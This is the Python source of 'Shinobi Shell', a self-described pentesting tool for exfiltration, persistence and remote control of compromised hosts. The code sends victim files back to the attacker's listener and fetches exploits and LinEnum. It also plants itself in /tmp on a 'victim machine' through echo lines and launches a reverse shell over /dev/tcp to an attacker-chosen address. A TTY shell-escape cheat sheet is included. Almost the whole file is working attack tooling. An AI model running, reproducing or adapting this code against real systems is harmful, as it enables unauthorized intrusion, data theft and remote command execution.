#! /usr/bin/python
import os
import cmd
import sys
import time
import socket

try:
        import thread
except ImportError:
        import _thread

import select
import base64
import signal
import argparse
import datetime

try:
    from shlex import quote
except ImportError:
    from pipes import quote

encryptionAvailable = False
try:
	from Crypto.Cipher import AES
	encryptionAvailable = True
except ImportError:
	encryptionAvailable = False
	print("WARNING -> Crypto.Cipher Library not available on this machine.... Your shell will work but there's no encryption...")


parser = argparse.ArgumentParser(description='Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.', prog='PROG', usage='%(prog)s [options]')

parser.add_argument('-t', '--ttyCheat', help='Shows tty shell cheat sheet', action="store_true")
parser.add_argument('-c',  '--connect', help='Flag that indicates a reverse shell connection', action="store_true")
#parser.add_argument('-a', '--address', help='ip:port - The machine address with a Shinobi Shell listener running')
parser.add_argument('-l', '--listen', help='Starts Shinobi Shell listener on port passed in')
parser.add_argument('-k', '--key', help='Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients', action="store_true")
parser.add_argument('-r', '--serveraddress', help='Local IP Address used for universal reverse shell handler')

#The Shinobi Shell command prompt
CMDPROMPT="|Shinobi[sh]ell|->:~$"

#This constant identifies the start of a shinobi message
STARTCONST="&&&shinobishell_start&&&"

#This constant is to identify message parts
BREAKCONST="&&&shinobishell_break&&&"

#This constant is used to determine when the end of a transmission has been reached because python sockets.recv is to stupid to figure it out
ENDCONST="&&&shinobishell_end&&&"

#not implemented yet because apparently you need non-standard libs to capture keyboard events
commandHistory = []

#Ip address used for incoming reverse shell handler
serverAddress = ""

####SETUP TUNNEL ENCRYPTION####
args = vars(parser.parse_args())

#loot in key value pairs
lootChest = dict()
lootVersion = 0

#Creates a line break
def lb():
	print("")

#Runs a shell command
def runCommand(command):
	print(os.popen(command).read().strip())

try:
	
	if(args["key"]):
		print('Please enter your secret Key')
		print("Your secret key must be 16, 24 or 32 chars long")
		key = raw_input('key: ')
		secret_key = args["key"].strip()
		secretLength = len(secret_key)

	is16 = secretLength != 16
	is24 = secretLength != 24
	is32 = secretLength != 32

	if(is16 and is24 and  is32):
		print("Your secret key must be 16, 24 or 32 chars long")
		os._exit(0)

	cipher = AES.new(secret_key)

	PADDING = '{'
	BLOCK_SIZE = 32
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	print('Shinobi Tunnel Encrypted')
except:
	print('Shinobi Tunnel Plaintext ~~ Be aware')
	pass

try:
	EncodeAES = lambda s: base64.b64encode(cipher.encrypt(pad(s)))
	DecodeAES = lambda e: cipher.decrypt(base64.b64decode(e)).rstrip(PADDING)
except:
	pass
else:
	EncodeAES = lambda s: s
	DecodeAES = lambda e: e

#############################

#Sends a command with our custom padding because sockets are to fucking dumb to know when messages begin and end
def sendCommand(connection,command):
	payload = ""

	if(encryptionAvailable):
		payload = EncodeAES(STARTCONST + command + ENDCONST)
	else:
		payload = STARTCONST + command + ENDCONST

	if(len(payload) > 1024):
		totalChunks = len(payload)/1024
		print("TOTAL CHUNKS: " + str(totalChunks))
		chunkCount = 0
		while(len(payload)>0):
			if(len(payload) > 1024):
				time.sleep(.1)
				chunkCount = chunkCount + 1
				chunk = payload[:1024]
				connection.send(chunk)
				payload = payload[1024:]
			else:
				connection.send(payload)
				break
	else:
		if(encryptionAvailable):
			connection.send(EncodeAES(STARTCONST + command + ENDCONST))
		else:
			connection.send(payload)

#Waits for an incoming transmission
def getResult(connection):
	connection.setblocking(0)
	inputs = [connection]
	outputs = []
	result = ""

	while inputs:
		readable, writable, exceptional = select.select(inputs, outputs, inputs)
		for s in readable:

			data = connection.recv(1024)
			if("echo $0" in data):
				print("Identifying shell to server")
				connection.send('shinobishell')
				continue

			if(encryptionAvailable):
				data = DecodeAES(data)

			if data:
				result += data
				if(ENDCONST in data):
					break
			else:
				break

		if(ENDCONST in result):
			break

	result = result.replace(STARTCONST, "")
	result = result.replace(ENDCONST, "")
	inputs.remove(connection)
	return result

#Displays help info such as commands author info and preconfigured aliases
def displayHelpInfo():
	lb()
	print("Shinobi Shell v1.0")
	print("Author: Anthony Russell")
	print("Contact: Twitter @DotNetRussell")
	print("Blog: https://DotNetRussell.com  (don't hack me bro)")
	lb()
	print("Commands:")
	lb()
	print("help \t\t\t\t\tdisplays help information")
	print("machineinfo \t\t\t\tdisplays a series of machine variables to help with priv esc")
	print("searchsploit <search text> \t\tsends a searchsploit command back to your attacking machine and returns the results through shinobi tunnel")
	print("exfil <file name> \t\t\texfiltrates a file back to your attacking machine via shinobi tunnel")
	print("ssdownload <exploit path> \t\tdownloads a search sploit exploit from your attacking machine")
	print("download <url> \t\t\t\tdoes a wget for your file on your attacking machine and then transfers it to you over shinobi tunnel")
	print("linenum\t\t\t\t\tdownlods linenum.sh to the Shinobi Server and then transfers it back to the client")
	lb()
	print("Loot Chest:")
	lb()
	print("loot store <key> <value> \t\t stores a key value pair in your loot chest")
	print("loot <key> \t\t\t\t gets a loot value")
	print("loot show \t\t\t\t shows everything in loot chest")
	print("NOTE: Loot chest auto syncs with attacking machine")
	lb()
	print("Auto Aliases")
	lb()
	print("lsa == ls -la")
	lb()

#Attempts to exfiltrate the file passed in back to the Shinobi Server
def exfiltrateFile(connection,command):
	print("Attempting to exfiltrate file back to Shinobi Server. Standby for results...")
	targetFile = command[5:].strip()
	pathParts = targetFile.split("/")
	totalParts = len(pathParts)
	filename = pathParts[totalParts-1]
	fileBytes = open(targetFile).read()

	print("Prompting server for exfil")
	sendCommand(connection,"exfil")
	print("Waiting for server to be ready for file")
	isReady = getResult(connection)
	print("Response recieved")
	if("ready" in isReady):
		print("Server Ready! Sending file ...")
		sendCommand(connection,command + BREAKCONST + filename + BREAKCONST + str(len(fileBytes)) + BREAKCONST + fileBytes)
		print("Exfiltration completed!")
		lb()

#Attempts to download the file requested on the Shinobi Server and then returns it to the requesting machine
def downloadFile(connection,command):

	print("Requesting file from Shinobi Server. Standby for results...")
	try:
		sendCommand(connection,command)
	except:
		print("There was an exception while requesting your file")

	result = getResult(connection)
	print("File Transfer Completed!")
	filename = raw_input("Name for your file: ")
	print("Creating file localy")
	file = open(filename,'wb')
	print("Writing File")
	file.write(result)
	print("File write completed")
	lb()

#Attempts to download the file requested on the Shinobi Server and then returns it to the requesting machine
def linenumDownload(connection,command):

	print("Requesting file from Shinobi Server. Standby for results...")
	try:
		sendCommand(connection,command)
	except:
		print("There was an exception while requesting your file")

	result = getResult(connection)
	print("File Transfer Completed!")
	filename = "linenum.sh"
	print("Creating file localy")
	file = open(filename,'wb')
	print("Writing File")
	file.write(result)
	print("File write completed")
	lb()

#Attempts to download the requested searchsploit file from the Shinobi server
def downloadSearchSploitFile(connection,command):
	pathParts = command.split("/")
	totalParts = len(pathParts)
	filename = pathParts[totalParts-1]

	print("Requesting file " + filename +" from Shinobi Server. Standby for results...")
	try:
		sendCommand(connection,command)
	except:
		print("There was an exception while requesting your file")

	result = getResult(connection)
	print("File Transfer Completed!")
	print("Creating file localy")
	file = open(filename,'wb')
	print("Writing File")
	file.write(result)
	print("File write completed")
	lb()

#Displays info about the machine that could prove useful
def displayMachineInfo():

	lb()
	print("---Machine Info---")
	lb()
	print("id:")
	runCommand("id")
	lb()
	print("Currently Logged In:")
	runCommand("who")
	lb()
	print("OS Info:")
	runCommand("cat /proc/version")
	lb()
	print("Listening Ports:")
	runCommand('netstat -ano | grep -E "LISTEN|127.0.0.1|0.0.0.0" | grep -v "LISTENING"')
	lb()
	print("Current root processes:")
	runCommand("ps aux | grep root")
	lb()

#Attempts to run a searchsploit command on the Shinobi Server with the passed in search criteria, then displays it to the user
def searchsploitCommand(connection,command):
	print("Sending command to Shinobi Server. Standby for results...")
	try:
		sendCommand(connection,command)
	except:
		print("There was an exception while sending your command")

	result = getResult(connection)
	print(result)

#Pulls the servers version of the loot chest
def getLootVersion(connection):
	sendCommand(connection,"currentLootVersion")
	return int(getResult(connection))

#Syncs the server loot with local loot chest
def syncLoot(connection):
	global lootVersion
	serverVersion = getLootVersion(connection)
	if(serverVersion == 0 and lootVersion == 0):
		return

	if(serverVersion < lootVersion):
		sendCommand(connection, "syncLoot"+BREAKCONST+str(lootVersion)+BREAKCONST+str(lootChest))
		serverVersion = getLootVersion(connection)
		if(serverVersion != lootVersion):
			print("Loot sync: Failed to update server loot chest")
			print("Local Version: " + str(lootVersion))
			print("Server Version: " + str(serverVersion))
	else:
		sendCommand(connection, "getLoot")
		lootChestUpdated = eval(getResult(connection))

		for k,v in lootChestUpdated.iteritems():
			if(k in lootChest):
				if( lootChest[k] == v):
					continue
				else:
					print("Loot key conflict!")
					print("During a loot chest sync with the server, a duplicate key was found in your chest with a value that doesn match")
					print("Server Loot Chest Entry")
					print("Key: " + k)
					print("Value: " + v)
					lb()
					print("Local Loot Chest Entry")
					print("Key: " + k)
					print("Value: " + lootChest[k])
					lb()
					print("How would you like to handle this?")
					print("Overwrite local value - OL")
					print("Change local loot name - CN")
					choice = raw_input("Choice: ")
					if("cn" in choice.lower()):
						key = k
						value = lootChest[k]
						lootChest[k] = v

						while True:
							newKey = raw_input("Please choose a new key: ")
							if(newKey in lootChest or newKey in lootChestUpdated):
								print("Key already exists in either server or local lootchest")
							else:
								lootChest[newKey] = value
								break
					elif("ol" in choice.lower()):
						lootChest[k] = v
			else:
				lootChest[k] = v

		lootVersion = serverVersion

#Syncs loot with the Shinobi server, stores loot locally, increments loot version and syncs loot with Shinobi server
def storeLoot(connection,command):

	syncLoot(connection)

	global lootVersion
	key = raw_input("Loot Key: ")

	overwrite = 'y'
	if(key in lootChest):
		overwrite = raw_input("Loot key already exists. Overwrite? ")

		if("yes" in overwrite.lower() or "y" in overwrite.lower()):
			value = raw_input("Loot Value: ")
			lootChest[key] = value
			lootVersion = lootVersion + 1
		else:
			print("Aborting")
	else:
		value = raw_input("Loot Value: ")
		lootChest[key] = value
		lootVersion = lootVersion + 1

	syncLoot(connection)

#Syncs loot from Shinobi server and then displays it
def displayLoot(connection):

	syncLoot(connection)

	print("LOOT CHEST:")
	lb()
	for k,v in lootChest.iteritems():
		print(" | " + k + " | " + v + " | ")
		lb()

#Syncs loot with Shinobi server then attempts to retrieve a value with the key passed in
def getLoot(connection, command):

	syncLoot(connection)

	lootKey = command[4:].strip()

	if(len(lootKey)==0):
		print("Please enter a loot key")
		print("Example:")
		print("loot myKey")
	else:
		if(lootKey in lootChest):
			print(lootKey)
			print(lootChest[lootKey])
		else:
			print("Loot not found!")

def displayPtyCheetSheet():
	print('TTY Cheet Sheet')
	print('')
	print('Python:\t\t\tpython -c \'import pty; pty.spawn("/bin/sh")\'')
	print('Bash:\t\t\techo os.system(\'/bin/bash\')')
	print('Sh:\t\t\t/bin/sh -i')
	print('Perl:\t\t\tperl -e \'exec "/bin/sh":\'')
	print('Perl:\t\t\texec "/bin/sh";')
	print('Ruby:\t\t\texec "/bin/sh"')
	print('Lua:\t\t\tos.execute(\'/bin/sh\')')
	print('Inside Vi:\t\t!bash')
	print('Inside Vi:\t\t:set shell=/bin/bash:shell')
	print('Inside Nmap:\t\t!sh')

#Handles user input
def handleCommand(connection,command):
	if(len(command) == 0):
		return

	if("searchsploit" in command[:12]):
		searchsploitCommand(connection,command)
	elif("machineinfo" in command[:11]):
		displayMachineInfo()
	elif("help" == command.strip().lower()):
		displayHelpInfo()
	elif("ssdownload" in command[:10]):
		downloadSearchSploitFile(connection,command)
	elif("lsa" in command[:3]):
		directory = command[3:]
		runCommand("ls -la " + directory)
	elif("download" in command[:8]):
		downloadFile(connection,command)
	elif("linenum" in command[:7]):
		linenumDownload(connection,command)
	elif("exfil" in command[:5]):
		exfiltrateFile(connection,command)
	elif("loot store" in command[:10]):
		storeLoot(connection,command)
	elif("loot show" in command[:9]):
		displayLoot(connection)
	elif("loot" in command[:4]):
		getLoot(connection,command)
	elif("cd" in command[:2]):
		try:
			os.chdir(command[2:].strip())
		except:
			print('Permission Denied')
	elif("exit" in command[:4]):
		sys.exit()
		return
	elif("echo $0" in command[:7]):
		print("shinobishell")
	else:
		runCommand(command)

#This is the Shinobi Client Shell
class ShinobiShellPrompt(cmd.Cmd):
	connectiion = ""	
	prompt = CMDPROMPT
	commands = ["machineinfo","help","searchsploit","ssdownload","download","exfil"]
	
	def default(self, line):
		handleCommand(self.connection, line)

	def precmd(self, line):
		currentTime = str(datetime.datetime.now()).strip()
		hostname = socket.gethostname().strip()
		currentUser = os.popen("id -un").read().strip()
		ipAddresses = os.popen("hostname -I").read().strip()
		metaLine = "###" + currentTime + " | " + hostname + "/" + currentUser + " | " + ipAddresses + " " + "###"
		print(metaLine)
		return line

	def postcmd(self, line, arg):
		currentDir = '[' + os.popen('pwd').read().strip() + ']';
		print(currentDir)
		return line

	def emptyline(self):
		pass

	def do_help(self,arg):
		handleCommand(self.connection, "help")
		pass

	def setConnection(self, connection):
		self.connection = connection

#starts a new shinobi shell
def startShell(connection):
	try:
		shell = ShinobiShellPrompt()
		shell.setConnection(connection)
		shell.cmdloop()
	except KeyboardInterrupt:
		lb()
		print("Type exit to close the shell")
		startShell(connection)

#Attempts to connect to a shinobi shell listener at the address and port passed in
#address = targetIp:targetPort
def connectToShinobiShellServer(address):
	addressArray = address.split(':')
	address = addressArray[0]
	port = int(addressArray[1])

	print('Connecting to Shinobi Shell at ' + address + ' on port ' + str(port))

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_address = (address, port)
	sock.connect(server_address)

	data = getResult(sock)

	if("shinobi_connected" in data):
		sys.stdout.write('Connection Successful') 
		print("Connection Successful")
		startShell(sock)
	else:
		print("Connection Failed")

#handles incoming connections
def listenerHandler(buf,conn,address):
	global lootChest
	global lootVersion

	if(len(buf)==0):
		return

	print(address + " command received: " + buf)

	if("searchsploit" in buf):
		print("executing searchsploit command")
		result = os.popen(buf).read()
		sendCommand(conn,result)
	elif("ssdownload" in buf):
		print("executing searchsploit download command")
		args = buf.split(" ")
		searchsploitRoot = "/usr/share/exploitdb/"
		file = open(searchsploitRoot + args[1],'r').read()
		sendCommand(conn,file)
	elif("download" in buf):
		print("executing file download command")
		url = buf[9:].strip().replace(" ","%20")
		try:
			file = os.popen("wget -O- " + url).read()
			sendCommand(conn,file)
		except:
			print("There was an error while downloading and sending your file back to the client")
	elif("exfil" in buf):
		print("executing exfil command")
		print("Sending ready command")
		sendCommand(conn,"ready")
		exfildata = getResult(conn)
		payloadParts = exfildata.split(BREAKCONST)
		payloadNameParts = payloadParts[1].split("/")
		payloadName = payloadNameParts[len(payloadNameParts)-1]
		payloadSize = payloadParts[2]
		payload = payloadParts[3]
		print("FILE NAME: " + payloadName)
		print("FILE SIZE: " + str(payloadSize))
		file = open("./" + payloadName, 'wb')
		file.write(payload)
		file.close()
		print("File Saved")
	elif("currentLootVersion" in buf):
		sendCommand(conn,str(lootVersion))
	elif("getLoot" in buf):
		sendCommand(conn,str(lootChest))
	elif("linenum" in buf):
		print("executing linenum download and return commnd")
		url = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
		try:
			file = os.popen("wget -O- " + url).read()
			sendCommand(conn,file)
		except:
			print("There was an error while downloading and sending your file back to the client")

	elif("syncLoot" in buf):
		print("Syncing Loot")

		lootPayload = buf.split(BREAKCONST)
		version = lootPayload[1]

		print("Current Loot Version: " + str(lootVersion))
		print("Incoming Loot Version: " + version)

		incomingLoot = lootPayload[2]
		if(version < lootVersion or (len(incomingLoot) == len(lootChest))):
			print("Rejecting loot sync because it's version is lower than current")
		else:
			for k,v in lootChest.iteritems():
				if(k not in incomingLoot):
					print("Rejecting loot sync because it has unsynced loot")
					return

			lootChest = eval(incomingLoot)
			lootVersion = version
		print("Loot Updated")
		print("Loot Version: " + str(lootVersion))

		file = open('shinobi_loot','wb')
		file.write(str(lootVersion)+BREAKCONST+str(lootChest))
		file.close()

#This loops endlessly for each connection thread. It receives commands and sends them off to the handler
def listenerThread(connection, address):
	print("Connection Opened")
	connection.send("echo $0\x0a")
	shelltype=connection.recv(1024)
	if("shinobishell" in shelltype):
		sendCommand(connection,"shinobi_connected")
		while True:
			inputs = [connection]
			outputs = []
			result = ""

			while inputs:
				readable, writable, exceptional = select.select(inputs, outputs, inputs)

				for s in readable:
					data = connection.recv(1024)
					if data:
						try:
							result += DecodeAES(data)
						except:
							result += data

						if(ENDCONST in data):
							break
					else:
						break

				result = result.replace(STARTCONST,"")
				result = result.replace(ENDCONST,"")
				listenerHandler(result,connection,address)
				result = ""
	else:
		print('Recieved a ' + shelltype.strip() + ' shell')
		print('Loading a shinobishell onto victim machine...')

		print('Attempting to navigate to writable directory...')
		connection.send('cd /tmp\x0a')

		print('Checking directory')
		connection.send('pwd\x0a')
		directory = connection.recv(1024)
		print(directory)
		if("/tmp" in directory):

			print("Checking for python")
			connection.send('which python\x0a')
			pythonPath = connection.recv(1024)

			if('python' in pythonPath):
				print("Directory Changed")
				print("Writing shinobishell.py...")

				scriptCode = open(os.path.realpath(__file__)).readlines()

				for line in scriptCode:
					payload = quote(line.replace('\n', ' ').replace('\r', ''))
					connection.send("echo " + payload + " >> shinobishell.py \x0a")

				print("Shell transfered!")
				print("Which address would you like the shell to be sent to? <ip>:<port>")
				addressPort = raw_input("~>").strip().split(":")
				port = args["listen"]

				print("Spawning remote Shinobi Shell ... ")
				connection.send(pythonPath.strip() + ' -u /tmp/shinobishell.py -k 1234567890123456 -a ' + serverAddress.strip() + ":" + port + ' >& /dev/tcp/' + addressPort[0] + '/' + addressPort[1] + ' 0>&1 \x0a ')

			else:
				print('Python not installed')

		else:
			print('No writeable directory found, sorry :-(')

#Attempts to start a Shinobi Shell listener on the port passed in
def setupShinobiShellListener(port):
	print('Listening for Shinobi Shell connections on port ' + port)
	print('Send me Ninja Connections!')

	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.bind(('0.0.0.0', int(port)))
	serversocket.listen(100) 

	while True:
		connection, address = serversocket.accept()
		thread.start_new_thread(listenerThread,(connection,address[0],))

if(args["serveraddress"]):
	serverAddress = args["serveraddress"]

if(args["connect"]):
	serveraddr = raw_input('Enter Server Address and port ~> example: 127.0.0.1:8080 : ')
	connectToShinobiShellServer(serveraddr)

if(args["listen"]):
	print("Looking for stored loot file in working directory..")
	if(os.path.isfile("shinobi_loot")):
		print("Loot file found, restoring loot cache")
		file = open("shinobi_loot").read()
		lootParts = file.split(BREAKCONST)
		lootVersion = lootParts[0]
		lootChest = eval(lootParts[1])
		print("Loot Chest Restored!")
	else:
		print("No loot chest cache found. Creating new chest")

	setupShinobiShellListener(args["listen"])

if(args["ttyCheat"]):
	displayPtyCheetSheet()